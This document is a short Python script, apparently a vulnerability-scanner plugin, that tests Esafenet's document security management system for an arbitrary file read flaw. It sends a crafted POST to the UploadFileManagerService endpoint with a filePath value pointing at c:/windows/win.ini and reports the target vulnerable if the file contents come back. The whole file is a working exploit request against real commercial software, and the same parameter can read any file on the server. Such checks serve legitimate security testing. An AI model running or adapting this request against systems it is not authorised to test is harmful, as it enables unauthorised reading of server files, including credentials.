import requests
import urllib

def verify(url):
    relsult = {
        'name': '亿赛通电子文档安全管理系统-UploadFileManagerService-任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    data = '''command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=111111'''
    vurl = urllib.parse.urljoin(url, "/CDGServer3/document/UploadFileManagerService;login")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and '[fonts]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult